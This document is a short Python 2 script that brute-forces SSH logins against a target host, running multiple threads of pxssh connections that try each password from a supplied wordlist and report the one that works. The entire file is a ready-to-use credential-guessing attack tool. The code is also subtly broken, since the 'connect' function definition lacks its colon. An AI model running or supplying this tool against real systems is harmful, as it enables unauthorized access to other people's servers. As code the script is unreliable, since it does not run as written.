# using pxssh to simplify the ssh interaction, part of pexpect
import pxssh
import optparse
import time

from threading import *

# Globals
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user, password, release)
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print ('[+] Password Found: ' + password)
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release: connection_lock.release()


def main():
    parser = optparse.OptionParser('usage%prog' + '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify a password list')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if (host is None) or (passwdFile is None) or (user is None):
        print parser.usage
        exit(0)
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print ('[*] Exiting: Password Found')
            exit(0)
        if Fails > 5:
            print ('[!] Exiting: Too Many Socket Timeouts')
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print('[-] Testing: ' + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()
    fn.close()

if __name__ == '__main__':
    main()